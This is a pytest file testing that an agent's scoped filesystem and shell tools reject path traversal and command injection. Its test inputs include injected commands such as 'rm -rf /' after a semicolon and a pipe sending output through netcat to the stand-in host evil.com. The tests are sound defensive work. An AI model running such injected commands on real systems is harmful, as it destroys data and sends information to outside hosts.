"""
Security tests for EngineeringExecutionAgent (Section 80).
Tests path traversal, command injection, secret protection, and scope escalation.
"""

import tempfile
import pytest

from research_agents.engineering_execution_agent.services.authorization_gate import AuthorizationGate
from research_agents.engineering_execution_agent.tools.filesystem_tool import ScopedFilesystemTool
from research_agents.engineering_execution_agent.tools.shell_tool import ScopedShellTool


def test_security_path_traversal_prevention():
    with tempfile.TemporaryDirectory() as tmp_dir:
        fs = ScopedFilesystemTool(project_root_dir=tmp_dir)

        # Attempting path traversal with ../
        with pytest.raises(PermissionError):
            fs.execute(
                operation="create",
                target_path="../../evil.py",
                content="# malicious",
                allowed_paths=["firmware/**"],
            )


def test_security_command_injection_rejection():
    with tempfile.TemporaryDirectory() as tmp_dir:
        shell = ScopedShellTool(project_root_dir=tmp_dir)

        # Command injection with semicolon
        with pytest.raises(PermissionError):
            shell.execute("python main.py; rm -rf /")

        # Command injection with subshell
        with pytest.raises(PermissionError):
            shell.execute("python $(whoami)")

        # Command injection with pipe
        with pytest.raises(PermissionError):
            shell.execute("python app.py | nc evil.com 1234")
